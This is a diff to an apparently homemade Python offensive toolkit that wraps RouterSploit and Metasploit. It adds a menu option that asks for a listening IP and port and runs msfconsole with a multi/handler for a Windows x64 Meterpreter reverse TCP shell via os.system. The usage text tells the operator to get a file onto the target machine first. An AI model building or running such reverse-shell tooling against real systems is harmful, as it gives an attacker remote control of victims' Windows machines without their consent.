@@ -513,15 +513,14 @@ def run_routersploit():
 
     except Exception as e:
         print(Fore.RED + f"Error running RouterSploit: {e}")
-import os
-from colorama import Fore
-
+        
 def metasploit_scan():
     try:
         while True:
             print(Fore.YELLOW + "99. to return to main menu")
             print("1. Launch Metasploit")
             print("2. Auto exploits")
+            print("3. Reverse Shell Option")  # Added option for reverse shell
             choice = input(Fore.BLUE + "\nEnter your choice: ").strip()
 
             print(Fore.YELLOW + f"Choice: '{choice}'")
@@ -648,6 +647,18 @@ def metasploit_scan():
                 else:
                     print(Fore.RED + "Invalid exploit choice. Exiting...")
                     continue
+
+            elif choice == '3':  # Reverse Shell Option
+                print(Fore.LIGHTCYAN_EX + "Launching Reverse Shell Option...")
+
+                print(Fore.WHITE+ "how to use (you will need to send a file over to the attackers machine to gain access first you will need to set up the listenr:")
+                lhost = input(Fore.BLUE + "Enter LHOST (your local IP this is your private ip):").strip()
+                lport = input(Fore.BLUE + "Enter LPORT (the port for the reverse shell): ").strip()
+
+                # Command for reverse shell
+                reverse_shell_command = f"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run\""
+                print(Fore.YELLOW + f"Executing: {reverse_shell_command}")
+                os.system(reverse_shell_command)
 
             elif choice == '99':  
                 print(Fore.LIGHTCYAN_EX + "Returning to the main menu...")
